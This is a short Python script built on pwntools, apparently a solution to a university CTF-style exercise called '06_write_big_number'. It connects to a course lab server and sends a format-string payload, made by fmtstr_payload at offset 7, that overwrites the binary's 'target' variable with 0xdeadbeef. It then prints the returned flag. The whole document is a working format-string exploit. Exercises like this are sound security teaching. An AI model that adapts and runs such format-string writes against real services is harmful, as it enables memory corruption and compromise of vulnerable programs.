from pwn import *

elf = ELF('06_write_big_number')
target_address = elf.symbols['target']

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25196

s = remote(SERVER, PORT, timeout=9999)
payload = fmtstr_payload(7, {target_address: 0xdeadbeef})
s.sendline(payload )
flag = s.recv(512)
print(flag)
